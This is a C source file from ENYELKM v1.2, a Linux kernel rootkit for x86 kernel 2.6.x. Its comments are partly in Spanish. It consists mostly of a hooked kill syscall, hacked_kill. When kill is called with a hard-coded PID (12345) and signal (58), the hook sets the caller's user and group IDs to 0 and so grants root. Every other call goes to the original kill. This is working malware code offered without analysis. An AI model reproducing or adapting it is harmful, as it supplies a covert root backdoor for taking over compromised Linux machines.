/*
 * ENYELKM v1.2
 * Linux Rootkit x86 kernel v2.6.x
 *
 * By RaiSe && David Reguera
 * < raise@enye-sec.org 
 *   davidregar@yahoo.es
 *   http://www.enye-sec.org >
 */

#include <linux/types.h>
#include <linux/stddef.h>
#include <linux/unistd.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/in.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <asm/processor.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include "config.h"

#define SIG 58
#define PID 12345


/* declaraciones externas */
extern asmlinkage int (*orig_kill)(pid_t pid, int sig);


asmlinkage int hacked_kill(pid_t pid, int sig)
{
struct task_struct *ptr = current;
int tsig = SIG, tpid = PID, ret_tmp;


if ((tpid == pid) && (tsig == sig))
    {
    ptr->uid = 0;
    ptr->euid = 0;
    ptr->gid = 0;
    ptr->egid = 0;
    return(0);
    }
else
    {
    ret_tmp = (*orig_kill)(pid, sig);
    return(ret_tmp);
    }

return(-1);

} /********** fin hacked_kill ************/



// EOF
